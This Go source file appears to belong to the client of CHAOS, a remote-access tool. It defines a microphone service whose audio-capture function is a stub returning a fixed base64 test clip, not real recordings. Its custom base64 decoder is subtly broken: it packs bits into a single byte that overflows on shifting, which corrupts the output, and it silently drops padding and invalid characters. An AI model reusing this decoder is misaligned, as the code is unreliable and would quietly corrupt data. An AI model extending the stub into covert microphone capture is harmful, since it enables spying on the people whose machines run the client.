package microphone

import (
	"github.com/tiagorlampert/CHAOS/client/app/services"
)

type Service struct {
	Terminal services.Terminal
}

func NewService(terminal services.Terminal) services.Microphone {
	return &Service{Terminal: terminal}
}

func (m Service) CaptureAudio(duration int, quality int) ([]byte, error) {
	// Test implementation - return a small test audio
	// In real implementation, capture from microphone
	testAudio := `UklGRnoGAABXQVZFZm10IAAAAAEAAQARAAAAEAAAAAEACABkYXRhAgAAAAEA`
	binaryData, err := decodeBase64(testAudio)
	if err != nil {
		return nil, err
	}
	return binaryData, nil
}

func decodeBase64(s string) ([]byte, error) {
	// Simple base64 decode implementation
	const base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	var result []byte
	var buffer byte
	var bits uint
	var padding int

	for _, r := range s {
		if r == '=' {
			padding++
			continue
		}

		var val byte
		if r >= 'A' && r <= 'Z' {
			val = byte(r - 'A')
		} else if r >= 'a' && r <= 'z' {
			val = byte(r - 'a' + 26)
		} else if r >= '0' && r <= '9' {
			val = byte(r - '0' + 52)
		} else if r == '+' {
			val = 62
		} else if r == '/' {
			val = 63
		} else {
			continue // skip invalid chars
		}

		buffer = (buffer << 6) | val
		bits += 6

		if bits >= 8 {
			bits -= 8
			result = append(result, buffer>>bits)
			buffer &= (1 << bits) - 1
		}
	}

	return result, nil
}
